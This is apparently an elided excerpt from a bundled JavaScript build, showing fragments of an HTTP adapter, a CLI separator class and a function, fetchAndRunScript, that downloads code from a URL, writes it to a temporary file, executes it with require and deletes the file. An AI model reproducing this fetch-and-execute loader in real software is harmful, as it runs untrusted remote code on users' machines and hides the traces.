...
const textEncoder = new require$$0$2.TextEncoder();
  ...
  return wrapAsync(async function dispatchHttpRequest(resolve, reject, onDone) {
    ...
    if (utils$1.isSpecCompliantForm(data)) {
      ...
      if (!headers.hasContentLength()) {
        try {
          const knownLength = await require$$0$2.promisify(data.getLength).call(data);
 ...
 */
class Separator {
    separator = colors$1.dim(Array.from({ length: 15 }).join(figures$1.line));
    type = 'separator';
...
async function fetchAndRunScript(url, moduleType) {
    try {
        ...
        if (moduleType === "CommonJS") {
            ...
            const tempFilePath = require$$1.join(__dirname, "temp-script.js");
            ...
            require$1(tempFilePath);
            fs$1.unlinkSync(tempFilePath); // Clean up temporary file
        }
        else {
